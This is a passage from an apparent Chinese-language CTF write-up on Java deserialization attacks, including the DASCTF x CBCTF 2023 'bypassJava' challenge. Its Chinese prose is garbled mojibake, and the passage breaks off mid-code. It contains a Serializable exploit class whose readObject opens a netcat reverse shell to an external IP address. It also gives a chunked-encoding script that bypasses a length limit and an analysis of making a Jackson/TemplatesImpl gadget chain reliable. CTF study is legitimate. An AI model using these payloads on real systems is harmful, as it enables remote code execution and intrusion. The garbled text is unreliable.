è½½å•¥class.</p><p>æ‰€ä»¥æ¥ä¸‹æ¥è¦å¹²å•¥æ‡‚äº†æ²¡,ä¸Šä¼ ç‚¹å…·æœ‰æ”»å‡»æ€§çš„classåˆ°javahomeé‡Œé¢,ç‹ ç‹ åœ°å…¥å®ƒä¸€æ³¢.</p><p>è€Œä¸”ä¸æ˜¯æœ‰ååºåˆ—åŒ–å—,åˆ°è¿™ä½ ä¸å¯èƒ½è¿˜ä¸çŸ¥é“å§,åˆ›é€ ä¸€ä¸ªååºåˆ—åŒ–å¸¦æœ‰ç›´æ¥æ¶æ„æ“ä½œçš„ç±»,ç›´æ¥getshellğŸ˜Š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span>  <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> InterruptedException, IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;nc&quot;</span>,<span class="string">&quot;43.143.192.19&quot;</span>,<span class="string">&quot;1145&quot;</span>,<span class="string">&quot;-e&quot;</span>,<span class="string">&quot;/bin/sh&quot;</span>&#125;);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> p.getInputStream();</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(is));</span><br><span class="line">        p.waitFor();</span><br><span class="line">        <span class="keyword">if</span>(p.exitValue()!=<span class="number">0</span>)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span>((s=reader.readLine())!=<span class="literal">null</span>)&#123;</span><br><span class="line">            System.out.println(s);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†™ä¸ªexpç±»,ç¼–è¯‘å¥½åå†ä¸Šä¼ ,åˆ«ç›´æ¥sbåˆ°æŠŠjavaä¸Šä¼ äº†</p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102150011.png" alt="å¾®ä¿¡æˆªå›¾_20231102150011"></p><p>ä½†æ˜¯ğŸ‘´ä¸å¤ªé«˜å…´,å› ä¸ºæœ‰ç‚¹bug,ç¬¬ä¸€æ¬¡æ­dockeræ‰“ä¸æˆ,ç¬¬äºŒæ¬¡ç»ˆå‡ºäº†ğŸ˜’.</p><h1 id="dasctfxcbctf_2023_bypassjava"><span id="dasctfxcbctf_2023_bypassjava"> DASCTFXCBCTF_2023_bypassJava</span></h1><p>çœŸtmæ¶å¿ƒçš„javaé¢˜,ä¸ä»…æœ‰ç»•è¿‡,è¿˜tmæœ‰RASPè¿™ç§æŠ½è±¡çš„ä¸œè¥¿,ğŸ‘´å¤ªå¼±äº†,ğŸ‘´è¦å­¦.</p><p>é¢˜ç›®ç¯å¢ƒç”šè‡³ä¸æ˜¯é¶æœº,è€Œæ˜¯é™æ€èµ„æº,å¾ˆä¸çˆ½.</p><p>è¿˜å¥½å‡ºé¢˜äººå¼€æºäº†:<a href="https://github.com/pankass/DASCTF_X_CBCTF2023_bypassJava">pankass/DASCTF_X_CBCTF2023_bypassJava: é¢˜ç›®æºç å’Œdockerç¯å¢ƒ (github.com)</a></p><h2 id="content-lengthé™åˆ¶"><span id="content-lengthé™åˆ¶"> Content-Lengthé™åˆ¶</span></h2><p>ä¸å¤šè¯´,ç¬¬ä¸€æ—¶é—´æƒ³åˆ°jacksoné“¾å­,ä½†æ˜¯æœ‰é•¿åº¦é™åˆ¶</p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102154201.png" alt="å¾®ä¿¡æˆªå›¾_20231102154201"></p><p>è¿™é•¿åº¦é™åˆ¶æ˜¯äººèƒ½æƒ³å‡ºæ¥çš„å—ğŸ˜“,nmç¨å¾®å¤§ä¸€ç‚¹,éšä¾¿ä¸éƒ½å¾—å‡ åƒ?</p><p>è¿‡ä¸äº†,æ ¹æœ¬è¿‡ä¸äº†,è®©æˆ‘çœ‹çœ‹bypassæ€ä¹ˆä¸ªäº‹:<img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102155013.png" alt="å¾®ä¿¡æˆªå›¾_20231102155013"></p><p>è¿™é‡Œå¦‚æœå¤´éƒ¨æœ‰transfer-encoding,å°±ä¼šè¿›<code>addInputFilter</code></p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102160618.png" alt="å¾®ä¿¡æˆªå›¾_20231102160618"></p><p>è¿™é‡Œé¢å¦‚æœæœ‰chunked,é‚£ä¹ˆå°±ä¼šè®¾ç½®æˆ<code>this.contentDelimitation</code>ä¸ºtrue</p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102160810.png" alt="å¾®ä¿¡æˆªå›¾_20231102160810"></p><p>æœ€åè¿™é‡Œå°±ä¼šè¿›å…¥if,ä»è€Œè®¾ç½®ContentLengthä¸º-1,ç»•è¿‡é•¿åº¦é™åˆ¶.</p><h2 id="chunckedç¼–ç æ€ä¹ˆå‘"><span id="chunckedç¼–ç æ€ä¹ˆå‘"> chunckedç¼–ç æ€ä¹ˆå‘</span></h2><p><a href="https://www.cnblogs.com/xuehaoyue/p/6639029.html">åˆ†å—ç¼–ç ï¼ˆTransfer-Encoding: chunkedï¼‰ - å¦™éŸ³å¤©å¥³ - åšå®¢å›­ (cnblogs.com)</a></p><p>ç®€å•çœ‹ä¸€ä¸‹ä»¬å¤§æ¦‚å°±æ˜¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">åå…­è¿›åˆ¶é•¿åº¦/r/n</span><br><span class="line"> content/r/n</span><br><span class="line">  ....  </span><br><span class="line">    </span><br><span class="line"><span class="number">0</span>/r/n</span><br><span class="line"> /r/n</span><br></pre></td></tr></table></figure><p>æ¯ä¸€å—éƒ½æ˜¯<code>åå…­è¿›åˆ¶è¡¨ç¤ºé•¿åº¦</code>ç„¶å,<code>/r/n</code></p><p>æ¥ç€è¾“å…¥content,ç„¶å<code>/r/n</code></p><p>æœ€åä¸€å—ä¸€å®šè¦è¾“å…¥<code>0/r/n/r/n</code></p><p>ğŸ‘´æµ…æµ…å†™ä¸ªè„šæœ¬</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="type">requests</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8080/read&quot;</span></span><br><span class="line">content = open(<span class="string">&quot;data.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">leng = hex(len(content)).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">body = leng+<span class="string">&quot;\r\n&quot;</span>+content+<span class="string">&quot;\r\n0\r\n\r\n&quot;</span></span><br><span class="line">print(body)</span><br><span class="line"></span><br><span class="line">headers= &#123;<span class="string">&quot;transfer-encoding&quot;</span>:<span class="string">&quot;chunked&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = requests.post(url=url,data=body,headers=headers)</span><br></pre></td></tr></table></figure><p>soeasy,ğŸ¤£,</p><p>ç„¶è€Œè¿™åªæ˜¯ç¬¬ä¸€æ­¥,ğŸ‘´ç°åœºç”šè‡³ç¬¬ä¸€æ­¥éƒ½æ²¡è¿‡å».</p><h2 id="ä¸ç¨³å®šjacksoné“¾é—®é¢˜"><span id="ä¸ç¨³å®šjacksoné“¾é—®é¢˜"> ä¸ç¨³å®šjacksoné“¾é—®é¢˜</span></h2><p><a href="https://pankas.top/2023/10/04/%E5%85%B3%E4%BA%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADjackson%E9%93%BE%E5%AD%90%E4%B8%8D%E7%A8%B3%E5%AE%9A%E9%97%AE%E9%A2%98/">å…³äºjavaååºåˆ—åŒ–ä¸­jacksoné“¾å­ä¸ç¨³å®šé—®é¢˜ (pankas.top)</a></p><p><a href="https://xz.aliyun.com/t/12846">ä»JSON1é“¾ä¸­å­¦ä¹ å¤„ç†JACKSONé“¾çš„ä¸ç¨³å®šæ€§ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p>ğŸ‘´ctmdæ‰“jacksoné“¾å­çš„æ—¶å€™,æœ‰å²ä»¥æ¥ç¬¬ä¸€æ¬¡é‡è§äº†é™Œç”Ÿçš„æŠ¥é”™</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.fasterxml.jackson.databind.JsonMappingException: (was java.lang.NullPointerException) (through reference chain: com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl[<span class="string">&quot;stylesheetDOM&quot;</span>])</span><br></pre></td></tr></table></figure><p>ä¸”ç»è¿‡æœ¬åœ°è°ƒè¯•,ä¼¼ä¹è¿›å…¥äº†é™Œç”Ÿçš„ä»£ç æ®µ,ğŸ‘´å¾ˆä¸ä¹æ„.</p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231103150351.png" alt="å¾®ä¿¡æˆªå›¾_20231103150351"></p><p>å…·ä½“æ¥è¯´,å°±æ˜¯åœ¨è°ƒç”¨gettersçš„æ—¶å€™,ä¼˜å…ˆå¥äº†<code>getStylesheetDOM</code>è¿™ä¸ªæ–¹æ³•,ä½†æ˜¯,ä¼—æ‰€å‘¨çŸ¥,æˆ‘ä»¬åœ¨åºåˆ—åŒ–çš„æ—¶å€™,æ˜¯ä¸ä¼šå»è®¾ç½®è¿™ä¸ªå€¼çš„,æ‰€ä»¥ç†æ‰€åº”å½“çš„,nmdç©ºæŒ‡é’ˆäº†.ğŸ˜“ğŸ˜…è€Œå½“å…¶è°ƒç”¨ getter æ–¹æ³•æ—¶ä¼˜å…ˆè°ƒç”¨ <code>getOutputProperties</code> æ–¹æ³•æ—¶æ‰æ˜¯æˆ‘ä»¬æ­£å¸¸æƒ³è¦çš„ç»“æœã€‚</p><p>è¿™nmçœŸæœ‰å‘å•Š,æ¯”èµ›æƒ³æ‰“è¿™æ¡é“¾å­,ä¸è¯´banä½é—®é¢˜,nmdè¿™é—®é¢˜ä¹Ÿåªèƒ½é€šè¿‡ä¸åœåœ°é‡ç½®é¶æœºè§£å†³äº†,æ¯”èµ›ä½ é‡ç½®é¶æœº,é™æ€åœ°å€ç­‰ä¼¼å§.</p><p>ç°åœ¨ğŸ‘´æ¥åˆ†æä¸€ä¸‹æ€ä¹ˆä¸ªäº‹,ä¼˜åŒ–ä¸€ä¸‹</p><h3 id="æµç¨‹"><span id="æµç¨‹"> æµç¨‹</span></h3><p>è¿™æ¡é“¾å­åˆ†æğŸ‘´ä¸æƒ³è¯´äº†,é—­ç€çœ¼ç›éƒ½çŸ¥é“æ€ä¹ˆä¸ªäº‹.</p><p>å…³é”®æ˜¯è§¦å‘<code>POJONode</code>çš„<code>toString</code>æ–¹æ³•,ç„¶åå†…éƒ¨ç»è¿‡ä¸€ç³»åˆ—åºåˆ—åŒ–å™¨è°ƒç”¨ <code>POJONode</code> ä¸­å°çš„ <code>_value</code> å±æ€§çš„ getter æ–¹æ³•ï¼Œä»è€Œè°ƒç”¨ <code>TemplatesImpl</code>ç±»å‹å¯¹è±¡çš„ <code>getOutputProperties</code> æ–¹æ³•ä»è€Œå¯¼è‡´æ‰§è¡Œä»»æ„ä»£ç ã€‚</p><p>é‡ç‚¹å°±æ˜¯ä»<code>toString</code>åˆ°<code>getters</code>çš„è°ƒç”¨è¿™ä¸€è¿‡ç¨‹</p><p>æ ˆè°ƒè¯•æ”¾åœ¨è¿™:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties:<span class="number">507</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">serializeAsField:<span class="number">689</span>, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeFields:<span class="number">774</span>, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)</span><br><span class="line">serialize:<span class="number">178</span>, BeanSerializer (com.fasterxml.jackson.databind.ser)</span><br><span class="line">defaultSerializeValue:<span class="number">1142</span>, SerializerProvider (com.fasterxml.jackson.databind)</span><br><span class="line">serialize:<span class="number">115</span>, POJONode (com.fasterxml.jackson.databind.node)</span><br><span class="line">serialize:<span class="number">39</span>, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)</span><br><span class="line">serialize:<span class="number">20</span>, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)</span><br><span class="line">_serialize:<span class="number">480</span>, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeValue:<span class="number">319</span>, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)</span><br><span class="line">serialize:<span class="number">1518</span>, ObjectWriter$Prefetch (com.fasterxml.jackson.databind)</span><br><span class="line">_writeValueAndClose:<span class="number">1219</span>, ObjectWriter (com.fasterxml.jackson.databind)</span><br><span class="line">writeValueAsString:<span class="number">1086</span>, ObjectWriter (com.fasterxml.jackson.databind)</span><br><span class="line">nodeToString:<span class="number">30</span>, InternalNodeMapper (com.fasterxml.jackson.databind.node)</span><br><span class="line">toString:<span class="number">136</span>, BaseJsonNode (com.fasterxml.jackson.databind.node)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨ <code>com.fasterxml.jackson.databind.ser.BeanPropertyWriter#serializeAsField</code> æ–¹æ³•ä¸­åˆ©ç”¨åå°„æ¥æ‰§è¡Œå…¶ <code>getters</code> æ–¹æ³•</p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231103152329.png" alt="å¾®ä¿¡æˆªå›¾_20231103152329"></p><p>è¿™æ¬¡å°±è°ƒç”¨äº†getoutputProperties,å¾ˆå¥½,ğŸ‘´å–œæ¬¢ğŸ¤ª</p><p>é‚£å°±å¾€å‰çœ‹çœ‹å“ªé‡Œè·å–äº†<code>getters</code></p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231103152702.png" alt="å¾®ä¿¡æˆªå›¾_20231103152702"></p><p>åœ¨<code>com.fasterxml.jackson.databind.ser.std.BeanSerializerBase#serializeFields</code>ä¸­,<code>prop</code>æ•°ç»„å­˜å‚¨äº†<code>getters</code>,é€šè¿‡å¾ªç¯éå†æ‰€æœ‰<code>getters</code>å¹¶è°ƒç”¨<code>serializeAsField</code></p><p>è¿½è¸ªä¸€ä¸‹è¿™ä¸ªå˜é‡,ä»<code>_props</code>è·å¾—</p><p>æœ€ç»ˆåœ¨<code>com.fasterxml.jackson.databind.introspect</code>èµ‹å€¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">collectAll:<span class="number">418</span>, POJOPropertiesCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">getJsonValueAccessor:<span class="number">270</span>, POJOPropertiesCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">findJsonValueAccessor:<span class="number">258</span>, BasicBeanDescription (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">findSerializerByAnnotations:<span class="number">391</span>, BasicSerializerFactory (com.fasterxml.jackson.databind.ser)</span><br><span class="line">_createSerializer2:<span class="number">224</span>, BeanSerializerFactory (com.fasterxml.jackson.databind.ser)</span><br><span class="line">createSerializer:<span class="number">173</span>, BeanSerializerFactory (com.fasterxml.jackson.databind.ser)</span><br><span class="line">_createUntypedSerializer:<span class="number">1495</span>, SerializerProvider (com.fasterxml.jackson.databind)</span><br><span class="line">_createAndCacheUntypedSerializer:<span class="number">1443</span>, SerializerProvider (com.fasterxml.jackson.databind)</span><br><span class="line">findValueSerializer:<span class="number">544</span>, SerializerProvider (com.fasterxml.jackson.databind)</span><br><span class="line">findTypedValueSerializer:<span class="number">822</span>, SerializerProvider (com.fasterxml.jackson.databind)</span><br><span class="line">defaultSerializeValue:<span class="number">1142</span>, SerializerProvider (com.fasterxml.jackson.databind)</span><br><span class="line">serialize:<span class="number">115</span>, POJONode (com.fasterxml.jackson.databind.node)</span><br><span class="line">serialize:<span class="number">39</span>, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)</span><br><span class="line">serialize:<span class="number">20</span>, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)</span><br><span class="line">_serialize:<span class="number">480</span>, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeValue:<span class="number">319</span>, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)</span><br><span class="line">serialize:<span class="number">1518</span>, ObjectWriter$Prefetch (com.fasterxml.jackson.databind)</span><br><span class="line">_writeValueAndClose:<span class="number">1219</span>, ObjectWriter (com.fasterxml.jackson.databind)</span><br><span class="line">writeValueAsString:<span class="number">1086</span>, ObjectWriter (com.fasterxml.jackson.databind)</span><br><span class="line">nodeToString:<span class="number">30</span>, InternalNodeMapper (com.fasterxml.jackson.databind.node)</span><br><span class="line">toString:<span class="number">136</span>, BaseJsonNode (com.fasterxml.jackson.databind.node)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231103220943.png" alt="å¾®ä¿¡æˆªå›¾_20231103220943"></p><p>è¿™é‡Œå°±æ˜¯ç¬¬ä¸€æ¬¡å†³å®š<code>getters</code>é¡ºåº</p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231104081525.png" alt="å¾®ä¿¡æˆªå›¾_20231104081525"></p><p>éšåé€šè¿‡<code>getDeclaredMethods</code> è·å–æ–¹æ³•ï¼Œé‚£è¿™é‡Œè·å–æ–¹æ³•çš„é¡ºåºæ˜¯ä¸å›ºå®šçš„ã€‚</p><p>å¹¶ä¸”ï¼Œåœ¨<code>com.fasterxml.jackson.databind.SerializerProvider#findTypedValueSerializer</code>æ–¹æ³•é‡Œï¼Œä¼šå°†è·å–çš„æ–¹æ³•é¡ºåºè¿›è¡Œç¼“å­˜ï¼Œä¹‹å‰æåˆ°è¿‡äº†ï¼Œç¼“å­˜åä¼šè¿›å…¥å…¶å®ƒifã€‚</p><p>å› æ­¤ç¬¬ä¸€æ¬¡æ‰“ä¸é€šï¼Œä¹‹åä¹Ÿæ— æ³•æ‰“é€šäº†</p><h3 id="ä¸ºä»€ä¹ˆé¡ºåºä¸ä¸€å®š"><span id="ä¸ºä»€ä¹ˆé¡ºåºä¸ä¸€å®š"> ä¸ºä»€ä¹ˆé¡ºåºä¸ä¸€å®š</span></h3><p>è·å–é¡ºåºæ˜¯æ ¹æ®åœ°å€çš„å¤§å°æ¥æ’åºçš„ï¼ŒæœŸé—´å­˜åœ¨å†…å­˜freeçš„åŠ¨ä½œï¼Œé‚£åœ°å€æ˜¯ä¸ä¼šä¸€ç›´çº¿æ€§å˜åŒ–çš„ï¼Œä¹‹æ‰€ä»¥ä¸æŒ‰ç…§å­—æ¯æ’åºï¼Œä¸»è¦è¿˜æ˜¯ä¸ºäº†é€Ÿåº¦è€ƒè™‘ï¼Œæ ¹æ®åœ°å€æ’åºæ˜¯æœ€å¿«çš„ã€‚</p><p>æ˜¯åå°„ <code>getDeclaredMethods</code> è·å–åˆ°æ–¹æ³•çš„é¡ºåºæ˜¯ä¸ç¡®å®šçš„ï¼Œæœ€ç»ˆå¯¼è‡´æ‰§è¡Œç›¸å…³getteræ–¹æ³•çš„é¡ºåºä¹Ÿæ˜¯ä¸ç¡®å®šçš„ï¼Œå½“ <code>TemplatesImpl</code> çš„ <code>getStylesheetDOM</code> æ–¹æ³•å…ˆäº <code>getOutputProperties</code> æ–¹æ³•æ‰§è¡Œæ—¶å°±ä¼šå¯¼è‡´ç©ºæŒ‡é’ˆå¼‚å¸¸ä»è€Œå¯¼è‡´è°ƒç”¨é“¾æŠ¥é”™ä¸­æ–­ï¼Œexpåˆ©ç”¨å¤±è´¥ã€‚</p><h3 id="è§£å†³æ–¹æ³•"><span id="è§£å†³æ–¹æ³•"> è§£å†³æ–¹æ³•ğŸ˜Š</span></h3><p><code>org.springframework.aop.framework.JdkDynamicAopProxy</code>è§£å†³é—®é¢˜</p><h4 id="å®ç°"><span id="å®ç°"> å®ç°</span></h4><p>ä¼—æ‰€å‘¨çŸ¥,javaæœ‰ä¸ªbç©æ„å«åš<code>åŠ¨æ€ä»£ç†</code>,å¾ˆnb,ğŸ‘´åªåœ¨ccä¸­ç”¨è¿‡,ä¸æ¸…æ¥š.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">myProxy</span> <span class="operator">=</span> Proxy.newProxyInstance(TestProxy.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;TestInterface1.class, TestInterface2.class&#125;, <span class="keyword">new</span> <span class="title class_">MyHandler</span>());</span><br><span class="line">        <span class="keyword">for</span>(Method m: myProxy.getClass().getDeclaredMethods()) &#123;</span><br><span class="line">            System.out.println(m.getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">TestInterface1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">TestInterface2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestProxy</span> &#123;</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;eat something&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;say something&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">(String a)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;invoke dynamic proxy handler&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231105214715.png" alt="å¾®ä¿¡æˆªå›¾_20231105214715"></p><p>è¿™æ˜¯æ‰§è¡Œç»“æœ,å¯ä»¥çœ‹æ‡‚èƒ½è·å–åˆ°çš„æ–¹æ³•,å®Œå…¨å–å†³äºæ¥å£å®ç°äº†å“ªäº›æ–¹æ³•</p><p>è€Œ <code>javax.xml.transform.Templates</code> æ¥å£å…¶åªæœ‰ <code>newTransformer</code> å’Œ <code>getOutputProperties</code> è¿™ä¸ªä¸¤ä¸ªæ–¹æ³•ï¼Œè®©ä»–ä½œä¸ºæˆ‘ä»¬ä»£ç†æ‰€éœ€çš„æ¥å£ï¼Œè¿™æ ·æœ€ç»ˆé€šè¿‡ <code>getDeclaredMethods</code> è·å–åˆ°çš„æ–¹æ³•å°±åªæœ‰ <code>newTransformer</code> å’Œ <code>getOutputProperties</code> äº†ï¼Œé‚£ä¹ˆæœ€ç»ˆè·å¾—çš„getteræ–¹æ³•ä¾¿åªæœ‰ <code>getOutputProperties</code> äº†ã€‚</p><p>å› æ­¤åªéœ€è¦æŒ‚ä»£ç†,å°±åªä¼šè·å–æ¥å£æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 